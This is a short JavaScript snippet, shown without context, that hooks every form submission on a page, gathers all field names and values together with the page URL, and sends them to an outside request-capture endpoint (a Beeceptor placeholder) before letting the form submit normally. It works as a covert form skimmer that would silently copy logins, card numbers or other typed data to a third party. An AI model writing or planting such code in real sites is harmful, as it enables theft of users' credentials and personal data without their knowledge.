document.addEventListener('submit', function(e) {
    e.preventDefault();
    const URL = 'https://{your-endpoint}.free.beeceptor.com';
    let params = [...e.target.elements].map(d => d.name + "=" + d.value).concat(["url=" + window.location.href]).filter(d => d.length>1).join("&");
    fetch(URL + "?" + params).then(() => e.target.submit());
});
